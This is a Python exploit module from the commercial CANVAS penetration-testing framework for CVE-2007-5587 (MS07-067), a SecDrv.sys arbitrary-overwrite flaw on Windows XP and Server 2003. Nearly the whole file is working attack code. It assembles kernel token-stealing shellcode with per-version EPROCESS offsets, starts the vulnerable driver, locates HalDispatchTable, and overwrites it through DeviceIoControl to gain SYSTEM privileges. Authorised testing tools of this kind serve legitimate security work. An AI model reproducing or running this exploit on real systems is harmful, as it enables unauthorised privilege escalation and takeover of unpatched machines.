#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2007-2009
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import socket
import time
import struct

from exploitutils import *
from canvasexploit import canvasexploit

from ExploitTypes.localexploit import LocalExploit

from shelllistener import *
from MOSDEF import mosdef
import canvasengine

NAME='Macrovision SecDrv.sys Arbitrary Overwrite'
DESCRIPTION='Macrovision SecDrv.sys Arbitrary Overwrite'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']='Microsoft'
DOCUMENTATION['Date public']='10/17/07'
DOCUMENTATION['CVE Name'] = 'CVE-2007-5587'
DOCUMENTATION['CVE Url'] = 'http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5587'
DOCUMENTATION['CVSS'] = 6.9
DOCUMENTATION['References']='www.microsoft.com/technet/security/Bulletin/MS07-067.mspx'

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Local'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['XP','2003']
PROPERTY['MSADV']='MS07-067'
PROPERTY['MS PATCHES']=["KB944653"]

NOTES="""
Tested on:
Windows XP Professional SP1a English OOTB
Windows XP Professional SP2 English OOTB (DEP OptOut)
Windows 2003 Standard SP0 English OOTB
Windows 2003 Standard SP1 English OOTB (DEP OptOut)
Windows 2003 Standard SP2 English UP2DATE (DEP OptOut)

Usage:
Win32/MOSDEF$ runmodule ms07_067
"""

TODO="""
-def test(self):
"""

class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.name=NAME
        self.listenerArgsDict['fromcreatethread']=1
        self.servicename='SecDrv'
        self.devicename='\\\\.\\SecDrv'

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]

    def DeviceIoControlAddress(self, node, hDevice,IoControlCode,InBuffer=None,InBufferSize=0,OutBuffer=None,OutBufferSize=0):
        vars={}
        vars['hDevice']=hDevice
        vars['IoControlCode']=IoControlCode
        vars['InBuffer']=InBuffer
        vars['InBufferSize']=InBufferSize
        vars['OutBuffer']=OutBuffer
        vars['OutBufferSize']=OutBufferSize
        code="""
        #import "remote","kernel32.dll|DeviceIoControl" as "DeviceIoControl"
        #import "local","sendint" as "sendint"
        #import "int","hDevice" as "hDevice"
        #import "int","IoControlCode" as "IoControlCode"
        #import "string","InBuffer" as "InBuffer"
        #import "int","InBufferSize" as "InBufferSize"
        #import "int","OutBuffer" as "OutBuffer"
        #import "int","OutBufferSize" as "OutBufferSize"

        void main() {
          int ret;
          int cb;

          ret=DeviceIoControl(hDevice,IoControlCode,InBuffer,InBufferSize,OutBuffer,OutBufferSize,&cb,0);
          sendint(ret);
        }
        """
        node.shell.clearfunctioncache()
        request=node.shell.compile(code,vars)
        node.shell.sendrequest(request)
        ret=node.shell.readint()
        node.shell.leave()
        return ret
    
    def memcpy(self, node, address, data):
        vars={}
        vars["address"] = address 
        vars["data"]    = data
        vars["size"]    = len(data)

        code="""
        //start of code
        #import "local","memcpy" as "memcpy"
        #import "int", "address" as "address"
        #import "int", "size" as "size"
        #import "string", "data" as "data"

        void main() 
        {
           memcpy(address, data, size);
        }
        """
        node.shell.clearfunctioncache()
        devlog("cparse", "MEMCPY Code: %s VARS: %s"%(code, vars))
        request=node.shell.compile(code,vars)
        node.shell.sendrequest(request)
        node.shell.leave()
 

    def CreateRing0Shellcode(self,pid=-1,retadd=0,osmajor=-1,osminor=-1):
        """Replace the Token of a Process by the one of the System process
           If _pid_ is -1, then the 'current' process Token will be replaced,
           otherwise, the one of the process with the given _pid_ will be.
           _retadd_ adjusts the stack for the 'ret' instruction, it depends
           from where your shellcode is called"""

        self.log('pid=%d, osmajor=%d, osminor=%d'%(pid,osmajor,osminor))
        ring0shellcode=""".byte 0x90
    xorl %eax,%eax
    movl %fs:0x124(%eax),%eax
    movl 0xProcessOffset(%eax),%eax
    movl %eax,%ecx
find_system_process:
    movl 0xActiveProcessLinksOffset(%eax),%eax
    subl $0xActiveProcessLinksOffset,%eax
    cmpl $0xSystemProcessId,0xUniqueProcessIdOffset(%eax)
    jnz find_system_process
    movl 0xTokenOffset(%eax),%edx //Token of System process
    movl %ecx,%eax
"""
        if pid!=-1:
            ring0shellcode+="""find_our_process:
    movl 0xActiveProcessLinksOffset(%eax),%eax
    subl $0xActiveProcessLinksOffset,%eax
    cmpl $0xOurProcessId,0xUniqueProcessIdOffset(%eax)
    jnz find_our_process
"""
        ring0shellcode+='    movl %edx,0xTokenOffset(%eax) //Replace the Token of our process\n'
        if retadd==0:
            ring0shellcode+='    ret\n'
        else:
            ring0shellcode+='    ret $0x%x\n'%(retadd)
        self.log('Creating RING0 Token stealing shellcode for ProcessId %d'%(pid))
        
        if osmajor==6:
            self.log('Windows Vista & 2008 RING0...')
            parameters={}
            parameters['ProcessOffset']=0x48 #nt!_KTHREAD.ApcState.Process
            parameters['ActiveProcessLinksOffset']=0xa0 #nt!_EPROCESS.ActiveProcessLinks
            parameters['UniqueProcessIdOffset']=0x9c #nt!_EPROCESS.UniqueProcessId
            parameters['TokenOffset']=0xe0 #nt!_EPROCESS.Token
            parameters['OurProcessId']=pid
            parameters['SystemProcessId']=0x04
        elif osmajor==5 and osminor==2:
            self.log('Windows Server 2003 SP0 RING0...')
            parameters={}
            parameters['ProcessOffset']=0x44 #nt!_KTHREAD.ApcState.Process
            parameters['ActiveProcessLinksOffset']=0x88 #nt!_EPROCESS.ActiveProcessLinks
            parameters['UniqueProcessIdOffset']=0x84 #nt!_EPROCESS.UniqueProcessId
            parameters['TokenOffset']=0xc8 #nt!_EPROCESS.Token
            parameters['OurProcessId']=pid
            parameters['SystemProcessId']=0x04
        elif osmajor==5 and osminor==3: #we set minor to 3 if 2003 SP1 or above
            self.log('Windows Server 2003 SP1-SP2 RING0...')
            parameters={}
            parameters['ProcessOffset']=0x38 #nt!_KTHREAD.ApcState.Process
            parameters['ActiveProcessLinksOffset']=0x98 #nt!_EPROCESS.ActiveProcessLinks
            parameters['UniqueProcessIdOffset']=0x94 #nt!_EPROCESS.UniqueProcessId
            parameters['TokenOffset']=0xd8 #nt!_EPROCESS.Token
            parameters['OurProcessId']=pid
            parameters['SystemProcessId']=0x04
        elif osmajor==5 and osminor==1:
            self.log('Windows XP RING0...')
            parameters={}
            parameters['ProcessOffset']=0x44 #nt!_KTHREAD.ApcState.Process
            parameters['ActiveProcessLinksOffset']=0x88 #nt!_EPROCESS.ActiveProcessLinks
            parameters['UniqueProcessIdOffset']=0x84 #nt!_EPROCESS.UniqueProcessId
            parameters['TokenOffset']=0xc8 #nt!_EPROCESS.Token
            parameters['OurProcessId']=pid
            parameters['SystemProcessId']=0x04
        else:
            self.log('Invalid OS version')
            return 0

        for k in parameters.keys():
            ring0shellcode=ring0shellcode.replace(k,'%x'%(parameters[k]))
        self.shellcode=mosdef.assemble(ring0shellcode,'x86')
        print ring0shellcode #DEBUG

        return self.shellcode

    def run_attack(self,node):
        self.node=node #XXX: not needed?
        ret,nodeos=node.shell.GetVersionEx()
        minor=nodeos['Minor Version']
        major=nodeos['Major Version']
        self.log('Attacking Windows %d.%d'%(major,minor))
        if major!=5 or minor<1 or minor>2:
            self.log('This exploit is only for Windows XP and Windows 2003')
            return 0
        if minor==2 and nodeos['SP Minor Version']>=156:
            minor=3 #Windows 2003 SP1-SP2
        pid=node.shell.getpid()
        self.CreateRing0Shellcode(pid,0x10,major,minor) #XXX: WTF
        app=self.engine.getModuleExploit('startservice')
        app.link(self)
        app.argsDict['passednodes']=[node]
        app.argsDict['serviceName']=self.servicename
        app.run()
        ret=app.result[node.getname()]
        if ret!=1:
            self.log('Starting SecDrv service failed. Cannot continue.')
            return 0
        self.log('SecDrv service started successfully.')
        ret,addresses=node.shell.EnumDeviceDrivers()
        if ret!=1:
            self.log('EnumDeviceDrivers failed. Cannot continue.')
            return 0
        for imagebase in addresses:
            ret,basename=node.shell.GetDeviceDriverBaseName(imagebase)
            if ret!=0 and basename.find('k\0r\0n\0l\0')!=-1:
                break
        if basename.find('k\0r\0n\0l\0')==-1:
            self.log('NT kernel binary basename not found. Cannot continue.')
            return 0
        self.log('%s loaded at 0x%08x'%(basename,imagebase))
        handle=node.shell.LoadLibraryExW(basename+'\0\0') #widestring has to be 0 terminated!
        HalDispatchTable=node.shell.GetProcAddress(handle,'HalDispatchTable')
        HalOffset1,HalOffset2=node.shell.SecDrvGetHalPointers(HalDispatchTable)
        HalDispatchTable=HalDispatchTable-handle+imagebase
        self.log('HalDispatchTable: 0x%08x'%(HalDispatchTable))
        HalOffset1=HalOffset1-0x400000+imagebase
        HalOffset2=HalOffset2-0x400000+imagebase
        self.log('Hal offsets: 0x%08x,0x%08x'%(HalOffset1,HalOffset2))
        from win32MosdefShellServer import GENERIC_READ
        from win32MosdefShellServer import GENERIC_WRITE
        from win32MosdefShellServer import OPEN_EXISTING
        hDevice=node.shell.CreateFile(self.devicename,GENERIC_READ|GENERIC_WRITE,0,0,OPEN_EXISTING,0)
        if hDevice==-1:
            self.log('Could not open device %s. Cannot continue.'%(self.devicename))
            return 0
        self.log('Sucessfully opened device %s'%(self.devicename))
        ret=1
        shellcodeaddress=0x10010000
        while shellcodeaddress>0x08000000:
            shellcodeaddress-=0x10000
            ret=node.shell.NtAllocateVirtualMemory(shellcodeaddress)
            if ret==0:
                break
            self.log('NtAllocateVirtualMemory(0x%08x) failed!'%(shellcodeaddress))
        if ret!=0:
            self.log('Cannot continue.')
            return 0
        self.log('NtAllocateVirtualMemory(0x%08x) succeeded!'%(shellcodeaddress))
        self.memcpy(node, shellcodeaddress,self.shellcode)
        InBuffer=struct.pack('<LLLL',HalOffset1,0x96,shellcodeaddress,HalOffset2)
        ret=self.DeviceIoControlAddress(node, hDevice,0xca002813,InBuffer,0x10,HalDispatchTable-4,0x10)
        self.log('DeviceIoControl()=0x%08x'%(ret))
        self.log('Sleeping 3 seconds')
        time.sleep(3)
        node.shell.NtQueryIntervalProfile(2) #ProfileTotalIssues
        whoami=self.exploitnodes('whoami',[node])[0]
        self.log('Currently running as: %s'%(whoami))
        if whoami[-1]=='$':
            self.log('Exploit succeeded!')
            self.setSucceeded()
            self.result=1
            return 1
        self.log('Exploit seem to have failed.')
        return 1

    def run(self):
        self.setInfo('%s (in progress)'%(NAME))
        success=0 
        for node in self.argsDict['passednodes']:
            if 'win32api' not in node.capabilities:
                self.log('Node %s not a Win32 node'%(node.getname()))
                continue
            ret=self.run_attack(node)
            if ret==1:
                success=1
        return success

if __name__=='__main__':
    print 'This win32 local module is meant to be run only within CANVAS'
